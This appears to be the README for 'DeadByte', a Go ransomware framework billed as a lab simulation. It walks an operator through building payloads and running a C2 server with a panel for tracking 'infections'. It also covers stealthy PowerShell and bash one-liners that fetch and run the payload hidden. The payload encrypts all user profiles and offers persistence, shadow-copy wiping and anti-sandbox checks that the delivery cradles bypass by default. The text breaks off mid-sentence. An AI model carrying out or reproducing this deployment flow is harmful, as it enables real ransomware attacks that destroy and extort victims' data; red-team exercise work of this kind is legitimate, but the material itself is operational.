# DeadByte

A **simulated** ransomware framework for authorized labs (red team / defensive exercises).
Written entirely in Go (static binaries, no CGO), with modern cryptography
(X25519 + HKDF-SHA256 + AES-256-GCM), a C2 with a web panel and a recovery binary.

> **Warning:** this project is a SIMULATION for controlled environments. Do not use it
> against systems without explicit written authorization. No payment is real; the goal is to
> exercise detection (EDR/XDR/MDR), incident response and recovery processes.

## Operating from Kali (full flow)

This is the recommended flow for running DeadByte **with the C2 on Kali** and delivering to
**Windows** and **Linux** lab machines.

### 1) Install Go on Kali

```bash
sudo apt update && sudo apt install -y golang-go
go version        # must be >= 1.24
```

If the repository version is old, install the current release from the official site:

```bash
wget https://go.dev/dl/go1.26.3.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.26.3.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version
```

### 2) Get the project on Kali

Clone the repository:

```bash
git clone https://github.com/nullbyter19/deadbyte.git && cd deadbyte
```

Or copy the project folder from another machine:

```bash
# on the source machine:
scp -r ./deadbyte kali@192.0.2.10:/home/kali/
ssh kali@192.0.2.10 "cd ~/deadbyte && go mod download"
```

### 3) Automatic setup + menu (recommended)

**Shortest path on Kali** — two commands and you are done:

```bash
# 1) setup + tests + delivery pack (REAL blob generated)
C2_IP=192.0.2.10 bash scripts/setup-kali.sh

# 2) interactive menu (start/stop C2, generate delivery, status, export key...)
bash scripts/menu.sh
```

`setup-kali.sh` installs Go (if missing), builds, starts the C2, opens the port, runs the
test battery (API, beacon, heartbeat, feed, artifacts, dry-run) and **already generates**
`delivery/out/win-oneliner.txt` with the real blob embedded.

`menu.sh` is the terminal ops panel:

| Option | Action |
| --- | --- |
| 1 | full setup + tests |
| 2 / 3 | start / stop C2 |
| 4 | status + infections + events |
| 5 | generate the delivery pack (real blob) |
| 6 | show/copy the **Windows** one-liner |
| 7 | show the **Linux** one-liner |
| 8 | export the master private key |
| 9 | test battery (C2 running) |
| 10 | open the web panel |
| 13 | help: Windows does not work |

Useful setup variables (all optional):

| Variable | Default | Effect |
| --- | --- | --- |
| `C2_IP` | detected IP | IP advertised in the panel and in commands |
| `PORT` | `8443` | C2 port |
| `ADMIN_TOKEN` | `change-me-admin-token` | panel/API token |
| `BEACON_TOKEN` | `change-me-beacon-token` | beacon token |
| `MASTER_SECRET` | `change-me-master-secret` | master key secret |
| `INTERVAL` | `30` | heartbeat interval (s) |
| `FULL=1` | — | build all 24 binaries (default: current OS only) |
| `KEEP=1` | — | do not restart an already running C2 |
| `STOP=1` | — | stop the C2 after the tests |

Example with a fixed IP and tests that do not leave the C2 running:

```bash
C2_IP=192.0.2.10 PORT=8443 STOP=1 bash scripts/setup-kali.sh
```

### 4) Build the binaries on Kali

Build **everything** (C2, payload and decryptor for Windows/Linux/macOS × amd64/arm64):

```bash
cd deadbyte
./scripts/build-all.sh      # writes everything to dist/
```

Or only what you need — the C2 for Kali (linux/amd64) and the target payloads:

```bash
mkdir -p dist

# C2 and decryptor for Kali itself
go build -trimpath -ldflags "-s -w" -o dist/deadbyte-c2-linux-amd64        ./cmd/c2
go build -trimpath -ldflags "-s -w" -o dist/deadbyte-decryptor-linux-amd64 ./cmd/decryptor

# payload for Windows (x64) and Linux (x64) targets
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags "-s -w" -o dist/deadbyte-payload-windows-amd64.exe ./cmd/payload
GOOS=linux   GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags "-s -w" -o dist/deadbyte-payload-linux-amd64   ./cmd/payload
```

> Binaries land in `dist/`, the folder the C2 serves at `/artifacts/<name>` — that is where
> targets download the payload from (step 8).

### 5) Generate the master key

The master key (X25519 pair) is generated by the C2 itself and sealed in the database
(`deadbyte.db`). The **first** run creates the pair. To capture the **public** key right
away (it is embedded in the payload), run once with `-gen` using the same
tokens/secret you will use on the server:

```bash
cd deadbyte
./dist/deadbyte-c2-linux-amd64 -listen 0.0.0.0:8443 -db deadbyte.db \
  -admin-token change-me-admin-token -beacon-token change-me-beacon-token \
  -master-secret change-me-master-secret -gen
```

This prints the public key (base64). Keep it — the payload needs it.

> To rotate later, repeat with `-gen-force` (this invalidates files encrypted with the old
> key!).

### 6) Start the C2 on Kali

Open the port in the firewall and start the server **listening on `0.0.0.0`** so targets can
reach it over the lab network:

```bash
sudo ufw allow 8443/tcp        # or: sudo iptables -A INPUT -p tcp --dport 8443 -j ACCEPT

./dist/deadbyte-c2-linux-amd64 -listen 0.0.0.0:8443 -db deadbyte.db \
  -admin-token change-me-admin-token -beacon-token change-me-beacon-token \
  -master-secret change-me-master-secret -beacon-interval 30 -dist dist -verbose
```

| Flag | Purpose |
| --- | --- |
| `-listen 0.0.0.0:8443` | accepts connections from other machines (`127.0.0.1` is local only) |
| `-admin-token` | panel/API token (used in the browser and in queries) |
| `-beacon-token` | shared token the payload sends on every request |
| `-master-secret` | passphrase protecting the private key at rest (required to export it) |
| `-beacon-interval` | heartbeat cadence the C2 orders from payloads (seconds) |
| `-dist dist` | folder served at `/artifacts/` for binary delivery |

Note the **Kali IP** (`ip a` → e.g. `192.0.2.10`). All following steps use
`http://192.0.2.10:8443`.

### 7) Test the C2

```bash
# public key (should answer)
curl -s http://127.0.0.1:8443/api/v1/key/public

# register a test beacon (shows up in the panel as a "probe" infection)
# note: the X-DeadByte-Token header is mandatory (the payload sends it via -token)
curl -s -X POST http://127.0.0.1:8443/api/v1/beacon \
  -H "Content-Type: application/json" \
  -H "X-DeadByte-Token: change-me-beacon-token" \
  -d '{"hostname":"probe-kali","username":"kali","os":"linux","arch":"amd64","pid":1,"version":"1.1.0"}'

# web panel (in the Kali browser)
firefox http://127.0.0.1:8443/        # enter the admin token
```

### 8) Generate the payload configuration

The payload receives C2 + public key + token in an **obfuscated blob** (generated with
`-config-gen`). Generate one blob per target/kind of host, always pointing at the Kali IP.

**`-dirs` is now optional.** Without it, the payload **automatically discovers every user
profile** on the system and encrypts everything not required by the OS:

| OS | Discovered directories | Excluded from the sweep |
| --- | --- | --- |
| Windows | `C:\Users\*` (except `All Users`, `Default`, `Public`, `defaultuser0`, `Updatuser`) | `AppData`, `Application Data`, `Local Settings`, `$Recycle.Bin` |
| Linux | `/home/*` (except `lost+found`) | `.cache`, `.npm`, `.git`, `node_modules`, ... |
| macOS | `/Users/*` (except `Shared`, `Guest`, `.localized`) | `Library`, `.Trash`, ... |

To target specific directories, pass `-dirs` (comma-separated). Linux (user `target`):

```bash
./dist/deadbyte-payload-linux-amd64 -config-gen \
  -c2 "http://192.0.2.10:8443" \
  -pubkey "<PUBLIC-KEY-FROM-STEP-5>" \
  -token change-me-beacon-token \
  -dirs /home/target/Documents,/home/target/Downloads,/home/target/Pictures \
  -note-url "http://192.0.2.10:8443"
```

Windows (single quotes preserve the backslashes):

```bash
./dist/deadbyte-payload-linux-amd64 -config-gen \
  -c2 "http://192.0.2.10:8443" \
  -pubkey "<PUBLIC-KEY>" -token change-me-beacon-token \
  -dirs 'C:\Users\jdoe\Documents,C:\Users\jdoe\Desktop,C:\Users\jdoe\Downloads' \
  -note-url "http://192.0.2.10:8443"
```

> The blob is printed to the terminal — copy the whole line and use it in steps 8 and 10.
> Always validate first with `-dry-run` (only lists targets, does not encrypt).

### 9) Delivering the payload to targets

> **NEVER pass the literal text `<BLOB>`.** The payload exits silently
> (`FATAL: illegal base64 data` in the log). The correct flow generates the real blob and
> embeds it in the delivery scripts.

#### Recommended flow (stealthy, one paste)

On Kali (C2 running):

```bash
bash scripts/menu.sh
# option 5  -> generates delivery/out/*
# option 6  -> shows/copies the Windows one-liner
```

Or without the menu:

```bash
bash scripts/gen-delivery.sh          # generates delivery/out/ with the REAL blob
```

**Windows** — **normal** PowerShell (regular user, **not** Admin). Paste the entire contents
of `delivery/out/win-oneliner.txt`, **or**:

```powershell
powershell -ExecutionPolicy Bypass -File \\kali\share\win.ps1
# (copy delivery/out/win.ps1 to the target)
```

The script downloads the payload from `/artifacts/`, runs it hidden with
`-force -verbose -log-file` and **already carries the real blob**. Follow along:

```powershell
Get-Content $env:TEMP\deadbyte.log -Wait
```

**Linux** — on the target:

```bash
bash linux.sh
# or paste delivery/out/linux-oneliner.txt
tail -f /tmp/deadbyte.log
```

#### Why the Windows paste "does nothing"

| Cause | Symptom | Fix |
| --- | --- | --- |
| literal `-config "<BLOB>"` | immediate exit, no beacon | use the generated `win-oneliner.txt` |
| PowerShell as Admin | aborted by the guardrail | regular-user PowerShell |
| stale token `change-me-admin-token` | 401 on download | use `change-me-admin-token` |
| C2 unreachable | download error | `nc -vz 192.0.2.10 8443` |

#### Manual templates (only if you know the blob)

The `delivery/run.ps1` / `run.sh` templates still accept `-Blob` / `BLOB=`, but the value
must be the **real** blob (output of `-config-gen` or `delivery/out/.blob`), never the
placeholder.

### 10) Monitoring and commands (panel)

Open `http://192.0.2.10:8443/` (from any machine on the network), enter the admin token and:

- view registered infections (initial beacon + heartbeats), phase, file/byte counts;
- in the infection detail: **kill** (stops encryption), **beacon_off** (silences the
  payload), **proof** and **message** (injects a note into the ransom note);
- mark as **paid** (simulation) when you want to signal release;
- export the **private key** (requires the master secret) for recovery.

### 11) Recovery (decryptor)

On Kali, using the API to fetch the key and the decryptor against the data (copy the
target files over scp/mount, or run the decryptor on the target itself):

```bash
# export the key (equivalent to the panel button):
PRIV=$(curl -s -X POST http://127.0.0.1:8443/api/v1/key/export \
  -H "Authorization: Bearer change-me-admin-token" | python3 -c 'import sys,json;print(json.load(sys.stdin)["private_key"])')

# restore (on Kali, over data copied from the target):
./dist/deadbyte-decryptor-linux-amd64 -key "$PRIV" -dirs /mnt/target -delete

# or let the decryptor fetch the key directly from the C2 (admin token + master secret only):
./dist/deadbyte-decryptor-linux-amd64 -c2 http://127.0.0.1:8443 \
  -token change-me-admin-token -master-secret change-me-master-secret -dirs /mnt/target -delete
```

To restore on the Windows target itself, use `dist/deadbyte-decryptor-windows-amd64.exe`
with `-key "$PRIV" -dirs 'C:\Users\jdoe\Documents' -delete`.

### Troubleshooting (Kali)

| Symptom | Fix |
| --- | --- |
| `go: command not found` / version < 1.24 | step 1 (install or use the official tarball) |
| `connection refused` when testing the C2 | confirm the C2 is running and listening on `0.0.0.0` |
| target cannot reach the C2 | test `nc -vz 192.0.2.10 8443` from another machine; check `ufw status` and the IP (`ip a`) |
| payload aborts with "analysis environment" or "refusing to run elevated" | expected: add `-force` only in the lab (see guardrails) |
| "nothing happens" on Windows (window closes, no beacon) | **do not use a literal `<BLOB>`** — generate it with `menu.sh` option 5 and paste `win-oneliner.txt`; open `%TEMP%\deadbyte.log`; run **non-Admin** PowerShell; admin token = `change-me-admin-token`; check IP/firewall |
| payload runs but the C2 registers no infection | in the log, "beacon register failed" → check `-c2` (correct IP/port), `ufw`/routing and `-token` (must match the C2's `-beacon-token`) |
| payload encrypts nothing | run `-dry-run` to list targets; without `-dirs` it uses auto-discovery — the log shows the directories found |
| `database is locked` | bbolt accepts a single process per `deadbyte.db`; stop the old C2 before restarting |
| Kali AV flags the binary | expected (signature/heuristics); in the lab, exclude the project folder from clamav/real-time scanning; binaries are already stripped (`-s -w`) and built without CGO |

## Components

| Binary | Description |
| --- | --- |
| `deadbyte-payload` | Cross-platform payload (Windows/Linux/macOS) that encrypts files and beacons to the C2 |
| `deadbyte-c2` | C2 server with a web panel (infection, key and command management) |
| `deadbyte-decryptor` | Recovery tool: restores `.deadbyte` files using the master key |
| `deadbyte-xorgen` | Obfuscated literal generator (XOR+base64) for the `internal/obfs` package |

## Cryptography (summary)

- Operator master key: X25519 pair (Curve25519). The payload embeds only the **public
  key**.
- Per file: a random 32-byte key (`fileKey`), wrapped by ephemeral ECDH → master, with
  HKDF-SHA256 (salt `DeadByte-v1`, info `filekey-v1`) and AES-256-GCM.
- Data: AES-256-GCM in 1 MiB blocks (nonce = 4-byte big-endian counter + 8 zeros, an
  age STREAM-style construction).
- The original file name is encrypted as well (HKDF derived from `fileKey`).
- Private key at rest on the C2: sealed with Argon2id (time=3, mem=64 MiB, threads=4) +
  AES-256-GCM, format `DBKY1`.
- Per-file header: `DBYTE001` + version + ephemeral pub (32B) + nonce (12B) + wrapped key
  (48B) + size/ciphertext of the original name.

Full details: [docs/cryptography.md](docs/cryptography.md).

## Web panel

Open `http://192.0.2.10:8443/` and enter the admin token. 1990s BBS/ANSI look: green
phosphor with scanlines, colored figlet banner, warning strip, status ticker and slogans
scrolling in the DOS bar. Features: infection (beacon) list, per-target event sheet, mark as
"paid" (simulation), queue commands (`kill`, `beacon_off`, `proof`, `message`), download
binaries (`/artifacts/`) and export the master key (requires `master-secret`).

## Payload options

| Flag | Description |
| --- | --- |
| `-config <blob>` | obfuscated configuration (XOR 0xA7 + base64); generated with `-config-gen` |
| `-dirs <a,b>` | target roots; **empty = auto-discovery** of all OS user profiles |
| `-pubkey`, `-c2`, `-token` | master public key, C2 URL, beacon token |
| `-log-file <path>` | writes the log to a file (append, 0600) — essential with a hidden window |
| `-dry-run` | only enumerates targets, does not encrypt |
| `-offline` | encrypts without contacting the C2 (ID `OFFLINE-xxxxxx`) |
| `-force` | ignores the safety aborts (root, analysis environment) |
| `-persist` | installs persistence (Startup/autostart/LaunchAgent) |
| `-wipe-vss` | Windows: removes volume shadow copies (requires admin) |
| `-self-rename` | copies the binary to a random name in temp and re-executes |
| `-max-size`, `-max-files`, `-delay`, `-jitter`, `-interval` | limits and timing |

Precedence: **CLI flags > `-config` blob > defaults** (and values injected by
`-ldflags -X main.Builtin*`).

## Payload safety guardrails

- Refuses to run as root/admin without `-force` (the cradles already pass `-force` by
  default).
- Sandbox heuristics (CPUs ≤ 2, VM/container env, `/dev/kvm`, suspicious hostname) abort
  execution without `-force`.
- Denylist of system directories (`/proc`, `/sys`, `/usr`, `/Windows/System32`, ...) and of
  names that would break apps or bloat the run (`AppData`, `Library`, `.git`, `node_modules`,
  `.cache`, `.npm`, ...).
- Denylist of extensions critical to OS operation (`.exe`, `.dll`, `.sys`, `.vhd`, `.efi`,
  `.msi`, fonts, ...). User data — including `.db`, `.sqlite`, `.key`, `.pem`, `.crt` —
  **is** encrypted.
- Never encrypts its own binary, `.deadbyte`, notes, `.DS_Store`, `NTUSER.DAT`,
  `pagefile.sys`/`hiberfil.sys`; maximum size per file (default 100 MiB).
- `-dry-run` changes nothing; offline mode leaks no network data.

## Delivery (lab)

- `delivery/run.ps1` — PowerShell cradle (downloads the payload from `/artifacts/` and runs
